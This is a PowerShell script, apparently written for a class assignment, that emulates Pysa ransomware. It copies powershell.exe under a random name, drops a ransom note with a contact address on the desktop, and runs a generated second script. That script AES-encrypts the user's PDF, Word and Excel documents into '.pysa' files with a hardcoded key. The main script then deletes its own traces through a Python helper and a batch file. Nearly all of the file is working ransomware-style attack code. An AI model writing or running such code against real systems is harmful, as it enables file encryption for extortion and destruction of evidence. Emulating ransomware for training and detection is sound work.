# Copy the Powershell executable to User's home directory, with the name EnNoB-{#}.exe,
# where {#} is a number between 1000 and 9876.
$TargetNum = Get-Random -Minimum 1000 -Maximum 9876
$TargetPath= (
    Join-Path "$env:USERPROFILE" "EnNoB-$TargetNum.exe"
    )

Copy-Item "C:\Windows\system32\WindowsPowershell\v1.0\powershell.exe" $TargetPath

# check that the previous operation succeeded.
if ( Test-Path $TargetPath -PathType Leaf) {
    Write-Host "File $TargetPath was found"
} else {
    Write-Host "Either $TargetPath does not exist or it's not a file."
    exit 1 # non-zero exit code indicates failure
}

# Create a ransom note in the user's desktop directory
$RansomNote = (Join-Path $env:USERPROFILE "Desktop" "Readme.READ" )
$RansomDemand =`
 "If you want your files restored, please contact me at clearlyevil@earrayminkoff.tech. " +`
 "I look forward to doing business with you."

Set-Content $RansomNote $RansomDemand

# check that the previous operation succeeded.
if (Test-Path $RansomNote -PathType Leaf) {
    Write-Host "Ransom note successfully dropped to desktop directory."
} else {
    Write-Host "Either $RansomNote does not exist or it's not a file."
    exit 1 # non-zero exit code indicates failure
}

# Create and run step2.ps1

$step2Content=@'
# Export a list of all PDF, docx, and xlsx files in the Documents directory to files.csv
Get-ChildItem -Recurse -Include *.docx,*.xlsx,*.pdf -Path .\Documents | Export-Csv -Path files.csv

# Copied from DRTools Functions/Invoke-AESEncryption.ps1, replacing file extension
# Note: Using a SHA-256 hash of a user-provided string is TERRIBLE practice (https://stackoverflow.com/a/7577685)
# I'm only using this because I was explicitly told to in the assignment instructions
# https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

# Import CSV File
$fileList = Import-Csv -Path files.csv

# the URL for a stick-figure comic that explains AES encryption is the perfect key for this use.
$PysaEmulationKey = "https://www.moserware.com/2009/09/stick-figure-guide-to-advanced.html"

# Loop through the results
foreach ($f in $fileList) {
    Invoke-AESEncryption -Mode Encrypt -Key $PysaEmulationKey -Path $f.FullName
}

'@

Set-Content "step2.ps1" $step2Content

&$TargetPath './step2.ps1'

Remove-Item $TargetPath

# Delete step2.ps1 using what could be described as pseudo-obfuscation
$evidenceDestroyerCode = @"
from pathlib import Path

def main():
    with open('update.bat', 'w') as f:
        for file in Path().rglob('**/step2.ps1'):
            f.write(f'del {file}')


if __name__ == '__main__':
    main()
"@

$evidenceDestroyerFile = "destroyer.py"


Set-Content $evidenceDestroyerFile $evidenceDestroyerCode

Get-Content $evidenceDestroyerFile
python3.exe $evidenceDestroyerFile

Remove-Item $evidenceDestroyerFile

.\update.bat